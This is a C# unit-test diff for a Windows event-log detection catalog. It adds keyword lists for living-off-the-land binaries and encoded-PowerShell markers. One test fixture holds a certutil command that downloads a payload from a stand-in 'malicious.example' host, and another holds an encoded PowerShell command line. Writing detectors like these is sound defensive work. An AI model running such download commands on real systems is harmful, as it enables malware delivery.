@@ -56,6 +56,7 @@ public sealed class BuiltInCatalogValidationTests
     [InlineData("sysmon-lolbin-initiated-network", 3, "Image")]
     [InlineData("suspicious-ps-scriptblock-ioc-triage", 4104, "ScriptBlockText")]
     [InlineData("encoded-powershell-commandline-field", 4688, "CommandLine")]
+    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine")]
     public void CollapsedContainsAnyScenario_BenignPayload_MatchesNoRow(string scenarioId, int eventId, string field)
     {
         var filterSet = s_registry.BuildFilterSet(s_registry.Scenarios.Single(scenario => scenario.Id == scenarioId));
@@ -72,6 +73,7 @@ public sealed class BuiltInCatalogValidationTests
     [InlineData("sysmon-lolbin-initiated-network", 3)]
     [InlineData("suspicious-ps-scriptblock-ioc-triage", 3)]
     [InlineData("encoded-powershell-commandline-field", 1)]
+    [InlineData("lolbin-in-process-command-line", 1)]
     public void CollapsedContainsAnyScenario_HasExpectedRowCount(string scenarioId, int expectedRows)
     {
         var scenario = s_registry.Scenarios.Single(scenario => scenario.Id == scenarioId);
@@ -93,6 +95,7 @@ public sealed class BuiltInCatalogValidationTests
     [InlineData("lolbin-process-creation-by-name", 4688, "NewProcessName", "installutil.exe", "Red")]
     [InlineData("lolbin-process-creation-by-name", 4688, "NewProcessName", "certutil.exe", "Orange")]
     [InlineData("lolbin-process-creation-by-name", 4688, "NewProcessName", "bitsadmin.exe", "Orange")]
+    [InlineData("lolbin-process-creation-by-name", 4688, "NewProcessName", "wmic.exe", "Orange")]
     // sysmon-lolbin-initiated-network (Sysmon 3, Image): DarkRed / Red / Orange tiers.
     [InlineData("sysmon-lolbin-initiated-network", 3, "Image", "mshta.exe", "DarkRed")]
     [InlineData("sysmon-lolbin-initiated-network", 3, "Image", "wscript.exe", "DarkRed")]
@@ -111,11 +114,22 @@ public sealed class BuiltInCatalogValidationTests
     [InlineData("suspicious-ps-scriptblock-ioc-triage", 4104, "ScriptBlockText", "Reflection.Assembly]::Load", "Orange")]
     // encoded-powershell-commandline-field (Security 4688, CommandLine): single uncolored (None) row.
     [InlineData("encoded-powershell-commandline-field", 4688, "CommandLine", "-EncodedCommand", "None")]
+    [InlineData("encoded-powershell-commandline-field", 4688, "CommandLine", "-enc ", "None")]
     [InlineData("encoded-powershell-commandline-field", 4688, "CommandLine", "FromBase64String", "None")]
     [InlineData("encoded-powershell-commandline-field", 4688, "CommandLine", "IEX", "None")]
     [InlineData("encoded-powershell-commandline-field", 4688, "CommandLine", "DownloadString", "None")]
     [InlineData("encoded-powershell-commandline-field", 4688, "CommandLine", "-w hidden", "None")]
     [InlineData("encoded-powershell-commandline-field", 4688, "CommandLine", "-nop", "None")]
+    // lolbin-in-process-command-line (Security 4688, CommandLine): single uncolored (None) row, proxied-execution companion to lolbin-process-creation-by-name.
+    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine", "rundll32", "None")]
+    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine", "regsvr32", "None")]
+    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine", "mshta", "None")]
+    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine", "wmic", "None")]
+    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine", "certutil", "None")]
+    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine", "bitsadmin", "None")]
+    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine", "installutil", "None")]
+    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine", "wscript", "None")]
+    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine", "cscript", "None")]
     public void CollapsedContainsAnyScenario_MatchesEveryNeedleWithTierColor(
         string scenarioId,
         int eventId,
@@ -141,7 +155,7 @@ public sealed class BuiltInCatalogValidationTests
     // lolbin-process-creation-by-name (Security 4688, NewProcessName)
     [InlineData("lolbin-process-creation-by-name", 0, "DarkRed", "4688", "NewProcessName", new[] { "mshta.exe", "wscript.exe", "cscript.exe" })]
     [InlineData("lolbin-process-creation-by-name", 1, "Red", "4688", "NewProcessName", new[] { "rundll32.exe", "regsvr32.exe", "installutil.exe" })]
-    [InlineData("lolbin-process-creation-by-name", 2, "Orange", "4688", "NewProcessName", new[] { "certutil.exe", "bitsadmin.exe" })]
+    [InlineData("lolbin-process-creation-by-name", 2, "Orange", "4688", "NewProcessName", new[] { "certutil.exe", "bitsadmin.exe", "wmic.exe" })]
     // sysmon-lolbin-initiated-network (Sysmon 3, Image)
     [InlineData("sysmon-lolbin-initiated-network", 0, "DarkRed", "3", "Image", new[] { "mshta.exe", "wscript.exe", "cscript.exe" })]
     [InlineData("sysmon-lolbin-initiated-network", 1, "Red", "3", "Image", new[] { "powershell.exe", "pwsh.exe" })]
@@ -150,7 +164,9 @@ public sealed class BuiltInCatalogValidationTests
     [InlineData("suspicious-ps-scriptblock-ioc-triage", 0, "Red", "4104", "ScriptBlockText", new[] { "FromBase64String", "Invoke-Expression" })]
     [InlineData("suspicious-ps-scriptblock-ioc-triage", 1, "Orange", "4104", "ScriptBlockText", new[] { "DownloadString", "New-Object Net.WebClient", "Reflection.Assembly]::Load" })]
     // encoded-powershell-commandline-field (Security 4688, CommandLine) - single uncolored row
-    [InlineData("encoded-powershell-commandline-field", 0, "None", "4688", "CommandLine", new[] { "-EncodedCommand", "FromBase64String", "IEX", "DownloadString", "-w hidden", "-nop" })]
+    [InlineData("encoded-powershell-commandline-field", 0, "None", "4688", "CommandLine", new[] { "-EncodedCommand", "-enc ", "FromBase64String", "IEX", "DownloadString", "-w hidden", "-nop" })]
+    // lolbin-in-process-command-line (Security 4688, CommandLine) - single uncolored row, proxied-execution companion
+    [InlineData("lolbin-in-process-command-line", 0, "None", "4688", "CommandLine", new[] { "rundll32", "regsvr32", "mshta", "wmic", "certutil", "bitsadmin", "installutil", "wscript", "cscript" })]
     public void CollapsedContainsAnyScenario_RowIsCanonicalContainsManyOverExactNeedles(
         string scenarioId,
         int rowIndex,
@@ -207,16 +223,26 @@ public sealed class BuiltInCatalogValidationTests
             Description = "Faulting application name: WINWORD.EXE, version: 16.0.1, time stamp: 0x0"
         };
         Assert.Contains(officeSet, saved => saved.Compiled!.Predicate(wordCrash));
+    }
 
-        var lolbinSet = s_registry.BuildFilterSet(s_registry.Scenarios.Single(scenario => scenario.Id == "suspicious-lolbin-execution"));
-        var processCreate = new ResolvedEvent("Security", LogPathType.Channel)
-        {
-            LogName = "Security",
-            Source = "Microsoft-Windows-Security-Auditing",
-            Id = 4688,
-            Description = "A new process has been created. New Process Name: C:\\Windows\\System32\\rundll32.exe"
-        };
-        Assert.Contains(lolbinSet, saved => saved.Compiled!.Predicate(processCreate));
+    [Fact]
+    public void EncodedPowerShellCommandLine_MatchesEncAbbreviation_ButNotBenignEncodingParameter()
+    {
+        var filterSet = s_registry.BuildFilterSet(s_registry.Scenarios.Single(scenario => scenario.Id == "encoded-powershell-commandline-field"));
+        var encodedCommand = EventDataTestFactory.CreateEventWithData(("CommandLine", "powershell.exe -enc JABzAGMAcgBpAHAAdAA=")) with { Id = 4688 };
+        var benignEncoding = EventDataTestFactory.CreateEventWithData(("CommandLine", "powershell.exe -Command \"Get-Content log.txt -Encoding UTF8\"")) with { Id = 4688 };
+
+        Assert.Contains(filterSet, saved => saved.Compiled!.Predicate(encodedCommand));
+        Assert.DoesNotContain(filterSet, saved => saved.Compiled!.Predicate(benignEncoding));
+    }
+
+    [Fact]
+    public void LolbinInCommandLine_MatchesProxiedInvocation()
+    {
+        var filterSet = s_registry.BuildFilterSet(s_registry.Scenarios.Single(scenario => scenario.Id == "lolbin-in-process-command-line"));
+        var proxied = EventDataTestFactory.CreateEventWithData(("CommandLine", "cmd.exe /c certutil -urlcache -split -f http://malicious.example/x payload.exe")) with { Id = 4688 };
+
+        Assert.Contains(filterSet, saved => saved.Compiled!.Predicate(proxied));
     }
 
     [Fact]
